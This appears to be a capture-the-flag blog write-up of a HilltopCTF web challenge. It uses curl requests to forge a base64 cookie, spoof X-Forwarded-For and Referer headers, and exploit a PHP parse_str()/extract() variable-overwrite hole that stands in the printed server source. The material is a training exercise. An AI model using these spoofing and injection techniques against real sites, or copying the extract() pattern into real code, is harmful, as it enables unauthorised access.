@@ -1,0 +1,531 @@
+I"jW<h3 id="description">Description</h3>
+
+<p><img src="/assets/img/post_images/ac124913209c4c54a939f9b3c2456685.png" alt="43c9742c71aadc1b9f5302c9d20957d2.png" /></p>
+
+<h3 id="solving">Solving</h3>
+<p>Given a plain text website that says <strong>see what you don’t</strong>. 
+A simple GET request to the website returned <code class="language-plaintext highlighter-rouge">405 Method Not Allowed</code> status, which indicates that the request method is known but not supported to access the resources.</p>
+
+<p><img src="/assets/img/post_images/aef2b0029df440eeba1bb235595802b4.png" alt="6e3ba5b304ed16152a99b0285cd1b0aa.png" /></p>
+
+<p>Assuming from the challenge title, this challenge is related to HTTP protocol. So let’s spin up <code class="language-plaintext highlighter-rouge">curl</code>.</p>
+
+<p>As the GET request was responded by <code class="language-plaintext highlighter-rouge">405 Method Not Allowed</code>, I tried sending POST request instead:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>curl -XPOST http://192.81.210.234:10005/ -v
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>And received a response like below.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre></td> --><td class="rouge-code"><pre>*   Trying 192.81.210.234...
+* TCP_NODELAY set
+* Connected to 192.81.210.234 (192.81.210.234) port 10005 (#0)
+&gt; POST / HTTP/1.1
+&gt; Host: 192.81.210.234:10005
+&gt; User-Agent: curl/7.58.0
+&gt; Accept: */*
+&gt;
+&lt; HTTP/1.1 200 OK
+&lt; Date: Thu, 04 Jun 2020 09:17:07 GMT
+&lt; Server: Apache/2.4.38 (Debian)
+&lt; X-Powered-By: PHP/7.4.6
+&lt; Set-Cookie: identify=YWxsb3dfYWNjZXNzPWZhbHNl
+&lt; Content-Length: 0
+&lt; Content-Type: text/html; charset=UTF-8
+&lt;
+* Connection #0 to host 192.81.210.234 left intact
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>As shown above, the web responded with a <code class="language-plaintext highlighter-rouge">Set-Cookie</code> header, which is the way for the server to send cookies to the client. I repeated the request, but now with the given cookie attached:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre> curl -XPOST http://192.81.210.234:10005/ --cookie "identify=YWxsb3dfYWNjZXNzPWZhbHNl" -v
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>And here’s the response.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre></td> --><td class="rouge-code"><pre>*   Trying 192.81.210.234...
+* TCP_NODELAY set
+* Connected to 192.81.210.234 (192.81.210.234) port 10005 (#0)
+&gt; POST / HTTP/1.1
+&gt; Host: 192.81.210.234:10005
+&gt; User-Agent: curl/7.58.0
+&gt; Accept: */*
+&gt; Cookie: identify=YWxsb3dfYWNjZXNzPWZhbHNl
+&gt;
+&lt; HTTP/1.1 200 OK
+&lt; Date: Thu, 04 Jun 2020 09:29:08 GMT
+&lt; Server: Apache/2.4.38 (Debian)
+&lt; X-Powered-By: PHP/7.4.6
+&lt; X-Note: Your access has not been allowed. Please try again later.
+&lt; Content-Length: 0
+&lt; Content-Type: text/html; charset=UTF-8
+&lt;
+* Connection #0 to host 192.81.210.234 left intact
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>I noticed that among the headers there is an <code class="language-plaintext highlighter-rouge">X-Note</code> header (which seems to be a custom HTTP header) that says “<strong>Your access has not been allowed. Please try again later.</strong>”.</p>
+
+<p>In pursuit of allowing myself to the server, I examined the value of the cookie and found out that it was <em>base64-encoded</em>.</p>
+
+<p><img src="/assets/img/post_images/05a05c47083e44569938fbaee856460e.png" alt="053c6cf25c41af2165b7f288619b699f.png" /></p>
+
+<p>I decoded the cookie and found this:</p>
+
+<p><img src="/assets/img/post_images/3d7a0dfdadac48b0a4ac124883354d26.png" alt="caa5a9f746c5292c3509ab48478114be.png" /></p>
+
+<p>So I modified the value into <code class="language-plaintext highlighter-rouge">allow_access=true</code>, encoded it back into <em>base64</em> string, and send it again to the server.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre> curl -XPOST http://192.81.210.234:10005/ --cookie "identify=YWxsb3dfYWNjZXNzPXRydWU=" -v
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Here’s the response:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre></td> --><td class="rouge-code"><pre>*   Trying 192.81.210.234...
+* TCP_NODELAY set
+* Connected to 192.81.210.234 (192.81.210.234) port 10005 (#0)
+&gt; POST / HTTP/1.1
+&gt; Host: 192.81.210.234:10005
+&gt; User-Agent: curl/7.58.0
+&gt; Accept: */*
+&gt; Cookie: identify=YWxsb3dfYWNjZXNzPXRydWU=
+&gt;
+&lt; HTTP/1.1 200 OK
+&lt; Date: Thu, 04 Jun 2020 09:54:18 GMT
+&lt; Server: Apache/2.4.38 (Debian)
+&lt; X-Powered-By: PHP/7.4.6
+&lt; X-Note: The requested resource is only available for Internal IP only.
+&lt; Content-Length: 0
+&lt; Content-Type: text/html; charset=UTF-8
+&lt;
+* Connection #0 to host 192.81.210.234 left intact
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Now a different <code class="language-plaintext highlighter-rouge">X-Note</code> header appeared. The server denied me because I performed the request from a <strong>non-internal IP address</strong>. I assume it is rational to think an “Internal IP” is the loopback IP, or <code class="language-plaintext highlighter-rouge">127.0.0.1</code>. And to send the information to the server, I used the <code class="language-plaintext highlighter-rouge">X-Forwarded-For</code> header. The <code class="language-plaintext highlighter-rouge">X-Forwarded-For</code> is used for identifying the originating IP address of a client connecting to a web server when the client is connecting through an HTTP proxy or a load balancer.</p>
+
+<p>I sent the adjusted request to the server:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre> curl -XPOST http://192.81.210.234:10005/ --cookie "identify=YWxsb3dfYWNjZXNzPXRydWU=" --header "X-Forwarded-For: 127.0.0.1" -v
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>And here’s the response:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre></td> --><td class="rouge-code"><pre>*   Trying 192.81.210.234...
+* TCP_NODELAY set
+* Connected to 192.81.210.234 (192.81.210.234) port 10005 (#0)
+&gt; POST / HTTP/1.1
+&gt; Host: 192.81.210.234:10005
+&gt; User-Agent: curl/7.58.0
+&gt; Accept: */*
+&gt; Cookie: identify=YWxsb3dfYWNjZXNzPXRydWU=
+&gt; X-Forwarded-For: 127.0.0.1
+&gt;
+&lt; HTTP/1.1 200 OK
+&lt; Date: Thu, 04 Jun 2020 10:03:24 GMT
+&lt; Server: Apache/2.4.38 (Debian)
+&lt; X-Powered-By: PHP/7.4.6
+&lt; X-Note: Okay, but you're still not coming from http://localhost/.
+&lt; Content-Length: 0
+&lt; Content-Type: text/html; charset=UTF-8
+&lt;
+* Connection #0 to host 192.81.210.234 left intact
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Of course, it’s another different <code class="language-plaintext highlighter-rouge">X-Note</code>. The server satisfied, but now it required me to come from <code class="language-plaintext highlighter-rouge">http://localhost/</code>. To do so, I used the <code class="language-plaintext highlighter-rouge">Referer</code> header, which is used to identify the address of the webpage linked to the resource being requested. The <code class="language-plaintext highlighter-rouge">Referer</code> header stored the address of the previous web page that made me do the current request.</p>
+
+<p>So I sent the adjusted request to the server:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>curl -XPOST http://192.81.210.234:10005/ --cookie "identify=YWxsb3dfYWNjZXNzPXRydWU=" --header "X-Forwarded-For: 127.0.0.1" --header "Referer: http://localhost/" -v
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>And here’s the response:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre></td> --><td class="rouge-code"><pre>*   Trying 192.81.210.234...
+* TCP_NODELAY set
+* Connected to 192.81.210.234 (192.81.210.234) port 10005 (#0)
+&gt; POST / HTTP/1.1
+&gt; Host: 192.81.210.234:10005
+&gt; User-Agent: curl/7.58.0
+&gt; Accept: */*
+&gt; Cookie: identify=YWxsb3dfYWNjZXNzPXRydWU=
+&gt; X-Forwarded-For: 127.0.0.1
+&gt; Referer: http://localhost/
+&gt;
+&lt; HTTP/1.1 200 OK
+&lt; Date: Thu, 04 Jun 2020 10:08:13 GMT
+&lt; Server: Apache/2.4.38 (Debian)
+&lt; X-Powered-By: PHP/7.4.6
+&lt; X-Note: Hmm. Your content length () is not match with our rules, which is 10 bytes only.
+&lt; Content-Length: 0
+&lt; Content-Type: text/html; charset=UTF-8
+&lt;
+* Connection #0 to host 192.81.210.234 left intact
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>And it’s another bloody <code class="language-plaintext highlighter-rouge">X-Note</code>. But this one should be easy; the <em>content-length</em> must be 10 bytes, and I can fulfill that by adding <code class="language-plaintext highlighter-rouge">Content-Length</code> header with a value of 10.</p>
+
+<p>Here’s the request:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>curl -XPOST http://192.81.210.234:10005/ --cookie "identify=YWxsb3dfYWNjZXNzPXRydWU=" --header "X-Forwarded-For: 127.0.0.1" --header "Referer: http://localhost/" --header "Content-Length: 10" -v
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>And here’s the response:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+</pre></td> --><td class="rouge-code"><pre>*   Trying 192.81.210.234...
+* TCP_NODELAY set
+* Connected to 192.81.210.234 (192.81.210.234) port 10005 (#0)
+&gt; POST / HTTP/1.1
+&gt; Host: 192.81.210.234:10005
+&gt; User-Agent: curl/7.58.0
+&gt; Accept: */*
+&gt; Cookie: identify=YWxsb3dfYWNjZXNzPXRydWU=
+&gt; X-Forwarded-For: 127.0.0.1
+&gt; Referer: http://localhost/
+&gt; Content-Length: 10
+&gt;
+&lt; HTTP/1.1 200 OK
+&lt; Date: Fri, 05 Jun 2020 04:09:11 GMT
+&lt; Server: Apache/2.4.38 (Debian)
+&lt; X-Powered-By: PHP/7.4.6
+&lt; X-Note: I see you're not accepting our flag/*. Alright then, aborting.
+&lt; Content-Length: 0
+&lt; Connection: close
+&lt; Content-Type: text/html; charset=UTF-8
+&lt;
+* Closing connection 0
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Surely I’m not done. The next <code class="language-plaintext highlighter-rouge">X-Note</code> header told me to accept the <code class="language-plaintext highlighter-rouge">flag/*</code>, which is can easily be done with the <code class="language-plaintext highlighter-rouge">Accept</code> header. The <code class="language-plaintext highlighter-rouge">Accept</code> header is used to specify certain media types which are acceptable for the response.</p>
+
+<p>So I sent another request:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>curl -XPOST http://192.81.210.234:10005/ --cookie "identify=YWxsb3dfYWNjZXNzPXRydWU=" --header "X-Forwarded-For: 127.0.0.1" --header "Referer: http://localhost/" --header "Content-Length: 10" --header "Accept: flag/*" -v
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>And here’s the response:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+</pre></td> --><td class="rouge-code"><pre>*   Trying 192.81.210.234...
+* TCP_NODELAY set
+* Connected to 192.81.210.234 (192.81.210.234) port 10005 (#0)
+&gt; POST / HTTP/1.1
+&gt; Host: 192.81.210.234:10005
+&gt; User-Agent: curl/7.58.0
+&gt; Cookie: identify=YWxsb3dfYWNjZXNzPXRydWU=
+&gt; X-Forwarded-For: 127.0.0.1
+&gt; Referer: http://localhost/
+&gt; Content-Length: 10
+&gt; Accept: flag/*
+&gt;
+&lt; HTTP/1.1 200 OK
+&lt; Date: Fri, 05 Jun 2020 04:12:23 GMT
+&lt; Server: Apache/2.4.38 (Debian)
+&lt; X-Powered-By: PHP/7.4.6
+&lt; X-Note: Now you might post me debug=true anytime you need it.
+&lt; Content-Length: 0
+&lt; Connection: close
+&lt; Content-Type: text/html; charset=UTF-8
+&lt;
+* Closing connection 0
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">X-Note</code> header told me that I can post <code class="language-plaintext highlighter-rouge">debug=true</code> data, so I did that. I sent the request:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>curl -XPOST http://192.81.210.234:10005/ --cookie "identify=YWxsb3dfYWNjZXNzPXRydWU=" --header "X-Forwarded-For: 127.0.0.1" --header "Referer: http://localhost/" --header "Content-Length: 10" --header "Accept: flag/*" --data "debug=true" -v
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>And it turns out the action gives me the source code of the website. Here’s the source code:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+</pre></td> --><td class="rouge-code"><pre>&lt;?php
+    require_once "flag.php";
+
+    $admin = "";
+    if ($_SERVER['REQUEST_METHOD'] === "POST") {
+        if (!isset($_COOKIE['identify'])) {
+            setcookie('identify', base64_encode('allow_access=false'));
+        }
+        else {
+            $cookie = base64_decode($_COOKIE['identify']);
+            parse_str($cookie, $parsed);
+            // print_r($parsed);
+            @extract($parsed);
+            if (!@filter_var($allow_access, FILTER_VALIDATE_BOOLEAN)) {
+                header("X-Note: Your access has not been allowed. Please try again later.");
+            }
+            else {
+                if (@$_SERVER['HTTP_X_FORWARDED_FOR'] !== "127.0.0.1") {
+                    header("X-Note: The requested resource is only available for Internal IP only.");
+                }
+                else {
+                    if (@$_SERVER['HTTP_REFERER'] !== "http://localhost/") {
+                        header("X-Note: Okay, but you're still not coming from http://localhost/.");
+                    }
+                    else {
+                        if (@$_SERVER['CONTENT_LENGTH'] &lt; 10) {
+                            $len = $_SERVER['CONTENT_LENGTH'];
+                            header("X-Note: Hmm. Your content length ($len) is not match with our rules, which is 10 bytes only.");
+                        }
+                        else {
+                            if (@$_SERVER['HTTP_ACCEPT'] !== "flag/*") {
+                                header("X-Note: I see you're not accepting our flag/*. Alright then, aborting.");
+                            }
+                            else {
+                                if (!@isset($_POST['debug'])) {
+                                    header("X-Note: Now you might post me debug=true anytime you need it.");
+                                }
+                                else {
+                                    highlight_file( __FILE__ );
+                                }
+                            }
+                            if ($admin === "1337l333333333333333333333333t") {
+                                echo $flag;
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+    else {
+        header("HTTP/1.1 405 Method Not Allowed");
+        echo "See what you don't.";
+        exit;
+    }
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>It’s obvious that to get the flag, I need to modify the value of <code class="language-plaintext highlighter-rouge">$admin</code> into <code class="language-plaintext highlighter-rouge">1337l333333333333333333333333t</code>. There are two functions that I can use to achieve that. The first one is <code class="language-plaintext highlighter-rouge">parse_str()</code> function that parses a string into variables. For example, given this function call: <code class="language-plaintext highlighter-rouge">parse_str("foo=hacker&amp;bar=1337", $output);</code>. The <code class="language-plaintext highlighter-rouge">$output</code> variable from the second parameter will be an associative array with <code class="language-plaintext highlighter-rouge">foo</code> and <code class="language-plaintext highlighter-rouge">bar</code> as the key and <code class="language-plaintext highlighter-rouge">hacker</code> and <code class="language-plaintext highlighter-rouge">1337</code> as the respective value of each.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td> --><td class="rouge-code"><pre>$output = array(
+    "foo" =&gt; "hacker",
+    "bar" =&gt; "1337"
+);
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>The second function is <code class="language-plaintext highlighter-rouge">extract()</code> that imports variables into the current symbol table from an array. So, given the <code class="language-plaintext highlighter-rouge">$output</code> variable from above, <code class="language-plaintext highlighter-rouge">extract()</code> will create two variables <code class="language-plaintext highlighter-rouge">$foo</code> and <code class="language-plaintext highlighter-rouge">$bar</code> if they don’t yet exist, or replace the value of those variables if they already exist.</p>
+
+<p>To take advantage of both functions, I just need to alter my <code class="language-plaintext highlighter-rouge">identify</code> cookie into base64-encoded of <code class="language-plaintext highlighter-rouge">allow_access=true&amp;admin=1337l333333333333333333333333t</code>. The <code class="language-plaintext highlighter-rouge">parse_str()</code> function will change the <code class="language-plaintext highlighter-rouge">$output</code> variable into:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td> --><td class="rouge-code"><pre>$output = array(
+    "allow_access" =&gt; "true",
+    "admin" =&gt; "1337l333333333333333333333333t"
+);
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>And the <code class="language-plaintext highlighter-rouge">extract()</code> function will replace the value of <code class="language-plaintext highlighter-rouge">$admin</code> variable into <code class="language-plaintext highlighter-rouge">1337l333333333333333333333333t</code>.</p>
+
+<p>Simply put, here’s the modified cookie:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>identify=YWxsb3dfYWNjZXNzPXRydWUmYWRtaW49MTMzN2wzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzN0
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>And I sent the final request:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>curl -XPOST http://192.81.210.234:10005/ --cookie "identify=YWxsb3dfYWNjZXNzPXRydWUmYWRtaW49MTMzN2wzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzN0" --header "X-Forwarded-For: 127.0.0.1" --header "Referer: http://localhost/" --data "12345=true" --header "Accept: flag/*" -v
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>And there’s the flag.</p>
+
+<p><img src="/assets/img/post_images/c0e10931d77d427a98f690908e6e8056.png" alt="bee463428aa994dbf3f8b4ff42d988fb.png" /></p>
+
+<h3 id="the-flag">The Flag</h3>
+
+<p>Flag is <strong>HilltopCTF{HTTP_1s_just_4_game_right.}</strong></p>
+:ET
